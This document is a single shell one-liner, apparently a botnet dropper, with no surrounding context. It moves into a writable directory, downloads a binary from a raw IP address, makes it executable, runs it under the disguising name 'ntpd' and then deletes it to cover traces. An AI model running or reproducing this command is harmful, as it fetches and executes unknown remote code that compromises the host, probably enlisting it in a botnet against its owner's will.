cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.36.210.166/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
